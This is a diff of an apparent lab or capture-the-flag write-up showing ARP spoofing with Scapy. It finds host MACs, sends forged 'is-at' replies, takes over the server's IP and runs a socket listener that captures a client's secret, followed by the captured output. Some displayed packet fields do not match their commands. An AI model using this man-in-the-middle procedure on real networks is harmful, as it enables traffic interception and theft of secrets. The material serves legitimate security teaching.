@@ -2560,47 +2560,199 @@ network.run()
 user_host.interactive(environ=parent_process.environ())
 ```
 
-Find client MAC.
-
 ```
->>> srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.0.0.2"), timeout=2).hwsrc
+root@ip-10-0-0-1:/# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.0.1  netmask 255.255.255.0  broadcast 0.0.0.0
+        inet6 fe80::78a9:daff:fe11:a0a1  prefixlen 64  scopeid 0x20<link>
+        ether 7a:a9:da:11:a0:a1  txqueuelen 1000  (Ethernet)
+        RX packets 32  bytes 2588 (2.5 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 8  bytes 656 (656.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 0  bytes 0 (0.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
+
+### Pretending to be the server
+
+Find MAC address of client at `10.0.0.2`.
+
+```py
+>>> (Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="10.0.0.2")).display()
+###[ Ethernet ]###
+  dst       = ff:ff:ff:ff:ff:ff
+  src       = 62:36:34:95:d8:db
+  type      = ARP
+###[ ARP ]###
+     hwtype    = Ethernet (10Mb)
+     ptype     = IPv4
+     hwlen     = None
+     plen      = None
+     op        = who-has
+     hwsrc     = 62:36:34:95:d8:db
+     psrc      = 10.0.0.1
+     hwdst     = 00:00:00:00:00:00
+     pdst      = 10.0.0.2
+```
+
+```py
+>>> srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="10.0.0.2"), timeout=1, iface="eth0").hwsrc
 Begin emission
 
 Finished sending 1 packets
 *
 Received 1 packets, got 1 answers, remaining 0 packets
-'82:9b:33:50:df:78'
+'66:2d:54:5c:08:60'
 ```
 
-Find server MAC.
+Then we spoof an ARP request to `10.0.0.2` claiming that we are `10.0.0.3`, the intended server.
 
+```py
+>>> (Ether(dst="66:2d:54:5c:08:60", src="7a:a9:da:11:a0:a1") / ARP(op="is-at", hwsrc="7a:a9:da:11:a0:a1", psrc="10.0.0.3", hwdst="66:2d:54:5c:08:60", pdst="10.0.0.2")).display()
+###[ Ethernet ]###
+  dst       = c2:cd:39:4e:71:9f
+  src       = 62:36:34:95:d8:db
+  type      = ARP
+###[ ARP ]###
+     hwtype    = Ethernet (10Mb)
+     ptype     = IPv4
+     hwlen     = None
+     plen      = None
+     op        = is-at
+     hwsrc     = 62:36:34:95:d8:db
+     psrc      = 10.0.0.3
+     hwdst     = c2:cd:39:4e:71:9f
+     pdst      = 10.0.0.2
 ```
->>> srp1(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="10.0.0.3"), timeout=2).hwsrc
-Begin emission
 
-Finished sending 1 packets
-*
-Received 1 packets, got 1 answers, remaining 0 packets
-'22:fb:43:d8:0f:89'
-```
-
-Tell 10.0.0.2 (ClientHost) that you are 10.0.0.3 (ServerHost):
-
-```
->>> sendp(Ether(dst="82:9b:33:50:df:78")/ARP(op=2, psrc="10.0.0.3", pdst="10.0.0.2", hwsrc=get_if_hwaddr("eth0"), hwdst="82:9b:33:50:df:78"), iface="eth0", count=5)
+```py
+>>> sendp(Ether(dst="66:2d:54:5c:08:60", src="7a:a9:da:11:a0:a1") / ARP(op="is-at", hwsrc="7a:a9:da:11:a0:a1", psrc="10.0.0.3", hwdst="66:2d:54:5c:08:60", pdst="10.0.0.2"), iface="eth0", count=5)
 .....
 Sent 5 packets.
 ```
 
-Tell 10.0.0.3 (ServerHost) that you are 10.0.0.2 (ClientHost):
-
-```
->>> sendp(Ether(dst="22:fb:43:d8:0f:89")/ARP(op=2, psrc="10.0.0.2", pdst="10.0.0.3", hwsrc=get_if_hwaddr("eth0"), hwdst="22:fb:43:d8:0f:89"), iface="eth0", count=5)
-.....
-Sent 5 packets.
-```
+Now, let's add `10.0.0.3` to our `eth0` interface.
 
 ```
 root@ip-10-0-0-1:/# ip addr add 10.0.0.3/24 dev eth0
+```
+
+Finally, we have to set up a listener in order to capture the secret from the client.
+
+```py title="~/script.py" showLineNumbers
+import socket
+
+s = socket.socket()
+s.bind(("10.0.0.3", 31337))
+s.listen(1)
+
+print("[+] Waiting for connection from client...")
+conn, _ = s.accept()
+print("[+] Got connection!")
+
+print("[+] Sending secret prompt...")
+conn.sendall(b"secret: ")
+
+# Now the client will send the secret
+print("[+] Receiving secret...")
+secret_data = conn.recv(1024)
+
+if not secret_data:
+    print("[!] Didn't receive anything from client!")
+    conn.close()
+    exit()
+
+secret_hex = secret_data.decode().strip()
+print(f"[+] Captured secret: {secret_hex}")
+
+try:
+    secret = bytes.fromhex(secret_hex)
+    print(f"[+] Parsed secret: {secret.hex()}")
+except Exception as e:
+    print(f"[!] Failed to decode hex: {e}")
+
+conn.close()
+```
+
+```
+root@ip-10-0-0-1:/# python ~/script.py
+[+] Waiting for connection from client...
+[+] Got connection!
+[+] Sending secret prompt...
+[+] Receiving secret...
+[+] Captured secret: f9a5f8d3783f21fb271a3d912210cc4465152a08abe612aee6aef206036d2042
+[+] Parsed secret: f9a5f8d3783f21fb271a3d912210cc4465152a08abe612aee6aef206036d2042
+```
+
+### Pretending to be the client
+
+Find MAC address of server at `10.0.0.3`.
+
+```py
+>>> (Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="10.0.0.3")).display()
+###[ Ethernet ]###
+  dst       = ff:ff:ff:ff:ff:ff
+  src       = 62:36:34:95:d8:db
+  type      = ARP
+###[ ARP ]###
+     hwtype    = Ethernet (10Mb)
+     ptype     = IPv4
+     hwlen     = None
+     plen      = None
+     op        = who-has
+     hwsrc     = 62:36:34:95:d8:db
+     psrc      = 10.0.0.1
+     hwdst     = 00:00:00:00:00:00
+     pdst      = 10.0.0.2
+```
+
+```py
+>>> srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="10.0.0.3"), timeout=1, iface="eth0").hwsrc
+Begin emission
+.
+Finished sending 1 packets
+...................*
+Received 21 packets, got 1 answers, remaining 0 packets
+'da:8d:95:a7:ed:89'
+```
+
+Then we spoof an ARP request to `10.0.0.3` claiming that we are `10.0.0.2`, the client.
+
+```py
+>>> (Ether(dst="da:8d:95:a7:ed:89", src="7a:a9:da:11:a0:a1") / ARP(op="is-at", hwsrc="7a:a9:da:11:a0:a1", psrc="10.0.0.2", hwdst="da:8d:95:a7:ed:89", pdst="10.0.0.3")).display()
+###[ Ethernet ]###
+  dst       = da:8d:95:a7:ed:89
+  src       = 7a:a9:da:11:a0:a1
+  type      = ARP
+###[ ARP ]###
+     hwtype    = Ethernet (10Mb)
+     ptype     = IPv4
+     hwlen     = None
+     plen      = None
+     op        = is-at
+     hwsrc     = 7a:a9:da:11:a0:a1
+     psrc      = 10.0.0.2
+     hwdst     = da:8d:95:a7:ed:89
+     pdst      = 10.0.0.3
+```
+
+```py
+>>> sendp(Ether(dst="da:8d:95:a7:ed:89", src="7a:a9:da:11:a0:a1") / ARP(op="is-at", hwsrc="7a:a9:da:11:a0:a1", psrc="10.0.0.2", hwdst="da:8d:95:a7:ed:89", pdst="10.0.0.3"), iface="eth0", count=5)
+.....
+Sent 5 packets.
+```
+
+Next, we have to assign `10.0.0.2` to our `eth0` interface.
+
+```
+root@ip-10-0-0-1:/# ip addr add 10.0.0.2/24 dev eth0
 ```
 
